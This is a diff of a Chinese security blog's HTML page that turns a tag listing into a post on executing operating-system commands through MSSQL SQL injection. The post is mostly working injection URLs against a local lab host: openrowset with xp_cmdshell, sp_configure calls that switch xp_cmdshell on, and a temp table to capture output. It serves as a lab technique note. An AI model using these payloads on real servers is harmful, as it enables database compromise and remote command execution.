@@ -5,8 +5,6 @@
   <!-- SEO相关 -->
   
     
-      <meta name="robots" content="noindex,follow">
-    
   
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
@@ -24,9 +22,13 @@
 
   <!-- 页面元数据 -->
   
-  <title>标签：sql注入 - 我的小blog</title>
+  <title>mssql注入突破堆叠来执行命令 - 我的小blog</title>
+  
+    <meta name="keywords" content="mssql">
   
 
+  
+    <meta name="description" content="mssql注入突破堆叠">
   
 
   <!-- feed -->
@@ -231,7 +233,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper  dock' style="display: none;">
+        <div id="full" class='cover-wrapper post dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture"></div>
           
@@ -316,74 +318,214 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper" id="pjax-container">
           
 
-
 <div class='l_main'>
+  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
   
+
+
+  
+  <div class="article-meta" id="top">
     
-      
-  <section class="post-list">
     
-      
+    
+      <h1 class="title">
+        mssql注入突破堆叠来执行命令
+      </h1>
+      <div class='new-meta-box'>
         
           
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>gun97</p>
+  </a>
+</div>
+
+          
         
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/06/23/oracle/">
-        oracle注入
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      <p>oracle的一些常用的注入方法</p>
-    
+          
+            
+  <div class='new-meta-item category'>
+    <a class='notlink'>
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+    </a>
   </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
+
+
+          
         
-        <time>2021-06-23</time>
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2021年6月25日</p>
+  </a>
+</div>
+
+          
         
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
+      
+      <div id="lc-pv" data-title="mssql注入突破堆叠来执行命令" data-path="/2021/06/25/mssql/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
         
       </div>
+    
+  </div>
+
+
+  
+  
+  <p><strong>1、利用openrowset，适用于union和报错注入： 但是该方法在实际的运用中局限性还是很大的，因为在 mssql2005 及其以后，mssql对系统存储过程做了权限控制，Ad Hoc Distributed Queries 组件默认是不被启用的。</strong><br><code>http://192.168.31.89/sqli.php?id=-1 union select (select * from openrowset(&#39;sqloledb&#39;,&#39;dsn=locaserver;trusted_connection=yes&#39;,&#39;set fmtonly off exec master..xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;) for xml path),null,null</code><br><img src="/2021/06/25/mssql/1.jpg" class="lazyload" data-srcset="/2021/06/25/mssql/1.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1"></p>
+<p><code>http://192.168.31.89/sqli.php?id=-1 AND (select * from openrowset(&#39;sqloledb&#39;,&#39;dsn=locaserver;trusted_connection=yes&#39;,&#39;set fmtonly off exec master..xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;) FOR XML PATH(&#39;&#39;))=1</code></p>
+<p><code>http://192.168.31.89/sqli.php?id=-1 and 1=(select * from openrowset(&#39;sqloledb&#39;,&#39;dsn=locaserver;trusted_connection=yes&#39;,&#39;set fmtonly off exec master..xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;) for xml path)</code><br><img src="/2021/06/25/mssql/2.jpg" class="lazyload" data-srcset="/2021/06/25/mssql/2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="2"></p>
+<p><strong>2、如果能构造一个if语句则可以用：这个更好利用：几乎没限制，但前提是要知道怎么构造if语句。这里可以开启存储过程，接下来的就可以自由发挥了</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1 <span class="built_in">where</span> 1=1 <span class="keyword">if</span> 1=1 execute(<span class="string">&#x27;exec sp_configure &#x27;</span><span class="string">&#x27;show advanced options&#x27;</span><span class="string">&#x27;, 1;reconfigure;exec sp_configure &#x27;</span><span class="string">&#x27;xp_cmdshell&#x27;</span><span class="string">&#x27;, 1;reconfigure;exec xp_cmdshell &#x27;</span><span class="string">&#x27;whoami&#x27;</span><span class="string">&#x27;&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p><code>http://192.168.31.89/sqli.php?id=-1 if 1=1 execute(&#39;exec sp_configure &#39;&#39;show advanced options&#39;&#39;,1;reconfigure;exec sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1;reconfigure;exec xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;)</code><br>可以结合创建一个表来读取命令的执行结果的方法：<br><code>http://192.168.31.89/sqli.php?id=-1 if 1=1 execute(&#39;exec sp_configure &#39;&#39;show advanced options&#39;&#39;,1;reconfigure;exec sp_configure &#39;&#39;xp_cmdshell&#39;&#39;, 1;reconfigure;CREATE TABLE tmp (dir varchar(8000));insert into tmp(dir) exec xp_cmdshell &#39;&#39;whoami&#39;&#39;&#39;)</code><br><img src="/2021/06/25/mssql/3.jpg" class="lazyload" data-srcset="/2021/06/25/mssql/3.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="3"></p>
+<p><img src="/2021/06/25/mssql/4.jpg" class="lazyload" data-srcset="/2021/06/25/mssql/4.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="4"></p>
+<p><img src="/2021/06/25/mssql/5.jpg" class="lazyload" data-srcset="/2021/06/25/mssql/5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="5"></p>
+
+  
+  
+    
+    <div class='footer'>
       
-        <div>
-          <a class='readmore' href='/2021/06/23/oracle/'>
-            阅读全文
-          </a>
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=http://example.com/2021/06/25/mssql/>http://example.com/2021/06/25/mssql/</a></p>
+              
+            
+          </blockquote>
         </div>
+      
       
     </div>
   
+  
+    
 
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-06-25T19:41:37+08:00">
+  <a class='notlink'>
+    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
+    <p>更新于：2021年6月25日</p>
+  </a>
 </div>
 
-          </div>
         
       
-    
-  </section>
+        
+          
   
-    
-  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/mssql%E6%B3%A8%E5%85%A5/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>mssql注入</p></a></div>
 
 
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
     
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2021/06/25/mssql/&title=mssql注入突破堆叠来执行命令 - 我的小blog&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2021/06/25/mssql/&title=mssql注入突破堆叠来执行命令 - 我的小blog&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2021/06/25/mssql/&title=mssql注入突破堆叠来执行命令 - 我的小blog&summary="
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">
+          
+        </a>
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </div>
+
+
   
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2021/06/25/sqlserver/'>
+          <p class='title'>sqlserver注入:执行命令和写入exe的一些方法技巧<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>Mssql站库分离，sa权限注入,能正常执行命令,system权限,数据库服务器不出网，写入exe并执行命令的一些思路:
+实验环境：
+123web服务器：OS：win2012r2 	ip:192...</p>
+        </a>
+      
+    </div>
+  
+</article>
+
+
+
+
+
 </div>
 <aside class='l_side'>
   
@@ -391,126 +533,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
 
-<section class="widget blogger shadow desktop mobile">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/'>
-          <img no-lazy src='https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/blog/Logo-NavBar@3x.png'/>
-        </a>
-      
-    
-    
-      <div class='text'>
-        
-        
-        
-          <p><span id="jinrishici-sentence">我的小blog</span></p>
-          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
-        
-      </div>
-    
-    
-      <div class="social-wrapper">
-        
-          
-            <a href="/atom.xml"
-              class="social fas fa-rss flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="mailto:me@xxx.com"
-              class="social fas fa-envelope flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="https://gun97.github.io/"
-              class="social fab fa-github flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-          
-            <a href="/"
-              class="social fas fa-headphones-alt flat-btn"
-              target="_blank"
-              rel="external nofollow noopener noreferrer">
-              
-            </a>
-          
-        
-      </div>
-    
-  </div>
-</section>
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget category shadow desktop">
-    
-  <header>
-    
-      <a href='categories/'><i class="fas fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
-    
-  </header>
 
 
-    <div class='content'>
-      <ul class="entry navigation">
-        
-          <li><a class="flat-box"
-            title="/categories/web%E5%AE%89%E5%85%A8/" href="/categories/web%E5%AE%89%E5%85%A8/"
-            id="categorieswebE5AE89E585A8"
-            ><div class='name'>web安全</div><div class='badge'>(3)</div></a></li>
-        
-      </ul>
-    </div>
-  </section>
-
-
-  
-
-  
-    
-    
-  
-
-  <section class="widget tagcloud shadow desktop mobile">
-    
-  <header>
-    
-      <a href='tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/mssql%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">mssql注入</a> <a href="/tags/sqlserver%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4/" style="font-size: 14px; color: #999">sqlserver注入执行命令</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 14px; color: #999">sql注入</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 14px; color: #999">web安全</a> <a href="/tags/%E6%8A%80%E6%9C%AF/" style="font-size: 14px; color: #999">技术</a> <a href="/tags/%E6%97%A5%E8%AE%B0/" style="font-size: 14px; color: #999">日记</a>
-    </div>
-  </section>
-
-
-  
 
   
 
 
 </aside>
+
 
 
 		  
@@ -519,8 +549,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <script>
   window.pdata={}
-  pdata.ispage=false;
-  pdata.postTitle="";
+  pdata.ispage=true;
+  pdata.postTitle="mssql注入突破堆叠来执行命令";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   // header 这里无论是否开启pjax都需要
